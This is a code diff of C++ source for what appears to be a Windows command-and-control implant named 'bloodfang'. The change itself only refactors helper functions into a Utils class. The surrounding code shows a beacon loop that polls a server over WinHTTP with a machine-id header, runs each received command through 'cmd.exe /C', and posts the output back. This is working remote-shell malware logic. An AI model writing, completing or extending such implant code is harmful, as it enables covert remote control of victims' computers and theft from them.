@@ -2,6 +2,7 @@
 #include <constexpr.h>
 #include <cstddef>
 #include <resolve.h>
+#include <cstdint>
 #include "winhttp.h"
 
 #include "config/env.h"
@@ -12,15 +13,28 @@ extern "C" auto declfn entry(_In_ void *args) -> void {
   bloodfang::instance().start(args);
 }
 
-#include <cstdint>
+class Utils {
+    public:
+        static size_t strlen(const char* str);
+        static void* copy(void* dest, const void* src, size_t n);
+};
 
-size_t strlen(const char* str) {
+size_t Utils::strlen(const char* str) {
     size_t length = 0;
     while (*str != '\0') {
         length++;
         str++;
     }
     return length;
+}
+
+void* Utils::copy(void* dest, const void* src, size_t n) {
+    char* cdest = (char*)dest;
+    const char* csrc = (const char*)src;
+    for (size_t i = 0; i < n; i++) {
+        cdest[i] = csrc[i];
+    }
+    return dest;
 }
 
 class Term {
@@ -35,15 +49,6 @@ Term::Term(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_h
     this->ntdll_handle = ntdll_handle;
     this->kernel32_handle = kernel32_handle;
     this->user32_handle = user32_handle;
-}
-
-void *my_copy_memory(void *dest, const void *src, size_t n) {
-    char *cdest = (char *)dest;
-    const char *csrc = (const char *)src;
-    for (size_t i = 0; i < n; i++) {
-        cdest[i] = csrc[i];
-    }
-    return dest;
 }
 
 char* Term::run(char* command) {
@@ -82,8 +87,8 @@ char* Term::run(char* command) {
     }
 
     char* command_prefix = "cmd.exe /C ";
-    size_t command_prefix_len = strlen(command_prefix);
-    size_t command_len = strlen(command);
+    size_t command_prefix_len = Utils::strlen(command_prefix);
+    size_t command_len = Utils::strlen(command);
 
     char* command_buffer = (char*)rtl_alloc_heap(heap, 0, command_prefix_len + command_len + 1);
     if (command_buffer == NULL) {
@@ -135,7 +140,7 @@ char* Term::run(char* command) {
                 return "e:rtl_alloc_heap2";
             }
 
-            my_copy_memory(new_buffer, buffer, current_size);
+            Utils::copy(new_buffer, buffer, current_size);
             rtl_free_heap(heap, 0, buffer);
             buffer = new_buffer;
             capacity = new_capacity;
@@ -155,7 +160,7 @@ char* Term::run(char* command) {
                 _wsprintf(error_msg, "e:read_file_error_%d", last_error);
                 rtl_free_heap(heap, 0, buffer);
                 close_handle(read);
-                return (char*)rtl_alloc_heap(heap, 0, strlen(error_msg) + 1);
+                return (char*)rtl_alloc_heap(heap, 0, Utils::strlen(error_msg) + 1);
             }
         }
         if (bytes_read == 0) {
@@ -329,7 +334,7 @@ void Net::compose_id_header(char* id, const wchar_t** output) {
         return;
     }
 
-    size_t buffer_len = strlen(header_prefix) + strlen(id) + 1;
+    size_t buffer_len = Utils::strlen(header_prefix) + Utils::strlen(id) + 1;
 
     char* buffer = (char*)rtl_alloc_heap(heap, 0, buffer_len);
     if (!buffer) {
@@ -394,7 +399,7 @@ void Net::respond(char* id, char* response) {
         return;
     }
 
-    size_t response_len = strlen(response);
+    size_t response_len = Utils::strlen(response);
 
     if (!win_http_send_request(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)response, response_len, response_len, NULL)) {
         return;
@@ -659,7 +664,7 @@ auto declfn instance::start(_In_ void *arg) -> void {
     
 	while (1) {
         char* response = net.request(machine.get_id());
-        if (strlen(response) == 0) {
+        if (Utils::strlen(response) == 0) {
             sleep(MAIN_LOOP_SLEEP_MILI);
             continue;
         }
